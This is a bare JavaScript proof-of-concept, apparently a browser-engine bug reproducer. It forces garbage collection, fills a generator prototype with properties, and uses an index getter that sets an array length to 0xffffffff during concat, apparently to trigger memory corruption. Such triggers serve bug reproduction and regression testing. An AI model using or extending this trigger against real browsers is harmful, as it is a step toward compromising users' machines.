function gc() {
    for (let i = 0; i < 20; i++)
        new ArrayBuffer(0x1000000);
}

function trigger() {
    function* generator() {
    }

    for (let i = 0; i < 1022; i++) {
        generator.prototype['b' + i];
        generator.prototype['b' + i] = 0x1234;
    }

    gc();

    for (let i = 0; i < 1022; i++) {
        generator.prototype['b' + i] = 0x1234;
    }
}

trigger();

a = [1];
b = [];
a.__defineGetter__(0, function () {
    b.length = 0xffffffff;
});

c = a.concat(b);
